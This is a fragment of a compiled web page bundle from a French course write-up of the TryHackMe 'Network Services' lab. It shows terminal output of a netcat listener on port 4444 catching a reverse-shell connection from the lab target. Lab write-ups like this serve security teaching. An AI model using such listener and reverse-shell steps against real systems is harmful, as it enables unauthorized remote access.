<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">└─$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nc</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -lvp</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 4444</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">              </span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">listening</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> on</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [any] 4444 ...</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">10.10.65.56:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> inverse</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> host</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> lookup</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> failed:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Unknown</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> host</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">connect</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> to</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [10.11.82.176] from (</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">UNKNOWN</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) [10.10.65.56] 39200</span></span></code></pre></div><p>Ici, il s&#39;agit d&#39;un exemple très simplé du cours TryHackMe sur les <a href="https://tryhackme.com/r/room/networkservices" target="_blank" rel="noreferrer">services réseaux</a>, malgré qu&#39;il soit très peu probable que ce soit si facile en situation réelle.</p><hr><br><div class="info custom-block"><p class="custom-block-title">Sources</p><p>Ce cours s&#39;inspire (et utilise les images) de TryHackMe.com de la chambre &quot;<em>Network Services</em>&quot; : <a href="https://tryhackme.com/r/room/networkservices" target="_blank" rel="noreferrer">https://tryhackme.com/r/room/networkservices</a></p></div>`,48))])}const E=a(r,[["render",F]]);export{C as __pageData,E as default};
